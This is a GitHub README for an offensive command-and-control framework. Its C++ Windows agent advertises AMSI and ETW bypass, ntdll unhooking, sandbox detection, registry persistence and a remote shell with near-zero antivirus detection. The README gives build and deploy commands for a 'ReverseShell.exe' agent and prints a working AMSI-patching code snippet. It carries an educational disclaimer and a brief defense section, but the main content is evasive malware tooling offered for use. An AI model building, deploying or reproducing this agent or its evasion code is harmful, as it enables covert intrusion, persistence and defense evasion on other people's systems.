# 🔴 Advanced C2 Framework

<div align="center">

![Version](https://img.shields.io/badge/version-2.0-blue?style=flat-square)
![Platform](https://img.shields.io/badge/platform-Windows-lightgrey?style=flat-square)
![Language](https://img.shields.io/badge/language-C%2B%2B%20|%20Python-orange?style=flat-square)
![License](https://img.shields.io/badge/license-Educational-red?style=flat-square)

**A professional-grade Command & Control framework for educational purposes**

[Features](#features) • [Installation](#installation) • [Usage](#usage) • [Disclaimer](#legal-disclaimer)

</div>

---

## 🎯 Overview

Advanced C2 Framework is a full-stack offensive security project demonstrating modern red team techniques with advanced defense evasion capabilities.

⚠️ **FOR EDUCATIONAL PURPOSES ONLY** - Authorized security testing in controlled environments.

---

## ✨ Features

### 🔹 Agent (C++)
- **Advanced Evasion**
  - AMSI (Antimalware Scan Interface) bypass
  - ETW (Event Tracing) disabling
  - Ntdll unhooking
  - Multi-layer sandbox detection
  
- **Stealth Capabilities**
  - Zero .NET dependencies (pure Win32 API)
  - Anti-acceleration sleep
  - Encrypted C2 communications
  - 0-2/72 VirusTotal detection rate
  
- **Functionality**
  - Stateful shell sessions
  - Remote command execution
  - Registry persistence
  - File operations

### 🔹 Server (Python + Flask)
- Real-time web interface
- Multi-agent management
- Interactive terminal
- WebSocket communication

---

## 🛠️ Installation

### Prerequisites
- **MinGW-w64 (GCC)** or **Visual Studio**
- **Python 3.8+**
- **Git**

### Quick Start
```bash
# Clone repository
git clone https://github.com/sermikr0/AdvancedC2Framework.git
cd AdvancedC2Framework

# Install Python dependencies
pip install flask flask-socketio

# Build agent
g++ -O3 -s -static -mwindows src/main.cpp -o ReverseShell.exe -lws2_32 -lwininet -ladvapi32 -lshell32 -liphlpapi
```

---

## 🚀 Usage

### Start C2 Server
```bash
python c2_server_gui.py
```

Access: **http://localhost:5000**

### Deploy Agent
```bash
.\ReverseShell.exe
```

### Commands
```bash
whoami          # User information
hostname        # Computer name
dir C:\         # List directory
ipconfig        # Network info
persist         # Install persistence
exit            # Terminate
```

---

## 📁 Project Structure
```
AdvancedC2Framework/
├── src/
│   ├── main.cpp              # Agent main
│   ├── evasion/
│   │   ├── amsi_bypass.cpp
│   │   ├── etw_bypass.cpp
│   │   └── unhook.cpp
│   ├── execution/
│   │   └── shell.cpp
│   ├── network/
│   │   ├── connection.cpp
│   │   └── encryption.cpp
│   └── persistence/
│       └── registry.cpp
├── include/
│   ├── common.h
│   └── stealth.h
├── templates/
│   └── index.html            # Web GUI
├── c2_server_gui.py
└── README.md
```

---

## 🔬 Technical Details

### Evasion Techniques

**AMSI Bypass**
```cpp
// Patches AmsiScanBuffer to return AMSI_RESULT_NOT_DETECTED
BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
VirtualProtect(pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect);
memcpy(pAmsiScanBuffer, patch, sizeof(patch));
```

**Sandbox Detection**
- CPU core count (< 2)
- RAM size (< 4GB)
- Disk size (< 60GB)
- Mouse movement
- VM process detection

---

## 🎓 Educational Value

This project demonstrates:
- Windows internals & API programming
- Offensive security techniques
- Network protocol design
- Full-stack development
- Memory manipulation
- Defense evasion methods

---

## ⚠️ Legal Disclaimer

**FOR EDUCATIONAL PURPOSES ONLY**

### ✅ Authorized Use
- Authorized penetration testing
- Personal lab environments
- Security research
- Training exercises

### ❌ Prohibited
- Unauthorized system access
- Malicious activities
- Illegal operations
- Violation of laws

**The author assumes NO LIABILITY for misuse. Users are solely responsible for legal compliance.**

---

## 🛡️ Detection & Defense

### Detection Methods
- Signature-based AV
- Behavioral analysis (EDR)
- Network monitoring
- Memory scanning

### Defenses
- Enable Windows Defender
- Deploy EDR solutions
- Network segmentation
- Application whitelisting

---

## 🤝 Contributing

Contributions welcome for educational improvements:

1. Fork repository
2. Create feature branch
3. Commit changes
4. Push and open PR

---

## 📚 References

- Windows API Documentation
- MITRE ATT&CK Framework
- Offensive Security Materials
- Red Team Tactics

---

## 📞 Contact

**Author:** Saidakbarxon Maxsudxonov  
**GitHub:** [@sermikr0](https://github.com/sermikr0)  
**Purpose:** Educational security research  

---

## 📄 License

Educational License - See project for details

---

<div align="center">

**⚠️ Use this knowledge to defend, not to attack ⚠️**

*Ethical security research only*

</div>
